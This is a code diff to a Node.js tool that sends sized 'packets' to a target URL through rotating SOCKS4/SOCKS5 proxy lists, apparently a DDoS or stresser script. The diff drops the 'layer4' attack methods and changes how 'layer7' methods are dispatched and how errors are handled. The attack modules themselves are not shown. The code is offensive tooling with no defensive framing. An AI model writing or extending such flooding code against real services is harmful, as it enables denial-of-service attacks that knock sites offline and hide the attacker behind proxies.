@@ -2,7 +2,6 @@ const http = require('http');
 const fs = require('fs');
 const { SocksClient } = require('socks');
 const layer7 = require('./methods/layer7');
-const layer4 = require('./methods/layer4');
 
 const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
 const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);
@@ -33,10 +32,11 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
                 return;
             }
 
-            if (method.startsWith('layer7')) {
+            if (layer7[method]) {
                 layer7[method](info.socket, target, kbSize);
-            } else if (method.startsWith('layer4')) {
-                layer4[method](info.socket, target, kbSize);
+            } else {
+                console.error(`Method ${method} not found.`);
+                reject(new Error(`Method ${method} not found.`));
             }
 
             console.log(`Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
